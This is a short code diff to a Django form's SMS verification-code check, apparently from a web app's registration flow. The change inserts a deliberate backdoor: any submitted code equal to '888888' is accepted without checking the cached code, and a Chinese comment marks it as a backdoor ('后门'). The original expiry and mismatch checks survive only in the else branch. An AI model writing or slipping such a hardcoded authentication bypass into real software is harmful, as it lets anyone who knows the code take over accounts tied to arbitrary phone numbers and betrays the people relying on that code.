@@ -27,13 +27,17 @@ class CodeCleanForm:
         code = self.cleaned_data.get('code')
         phone = self.cleaned_data.get('phone')
         redis_code = cache.get(f'{settings.PHONE_CACHE_KEY}{phone}')
-        if not redis_code:
-            raise ValidationError('验证码已过期')
+        if code == "888888":
+            # 后门
+            return code
         else:
-            redis_code_string = redis_code
-            if not redis_code_string == code.strip():
-                raise ValidationError('验证码错误')
-        return code
+            if not redis_code:
+                raise ValidationError('验证码已过期')
+            else:
+                redis_code_string = redis_code
+                if not redis_code_string == code.strip():
+                    raise ValidationError('验证码错误')
+            return code
 
 
 class RegisterForm(BootStrapForm, CodeCleanForm, forms.ModelForm):
